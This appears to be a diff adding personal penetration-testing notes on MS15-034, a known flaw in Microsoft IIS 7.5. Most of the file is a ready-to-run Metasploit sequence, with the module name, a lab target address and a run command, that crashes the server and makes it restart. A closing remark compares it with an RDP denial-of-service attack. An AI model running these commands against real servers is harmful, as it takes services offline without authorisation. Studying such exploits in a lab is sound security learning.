@@ -1,0 +1,19 @@
+# version microsoft iis 7.5 is vulnerable to dos attack 
+
+# “The hacker dumps memory contents using crafted range headers
+# and if larger target file is used, then more memory is dumped, and more SSL data is also generated” leading to
+# denial of service attack.
+
+# we can use metasploit model for the attack
+
+search ms15-034
+
+use auxiliary/dos/http/ms15_034_ulonglongadd
+
+set RHOSTS 192.168.56.3
+
+run
+
+# this will make the server to restart
+
+# the difference between this and rdp dos is the port are different.
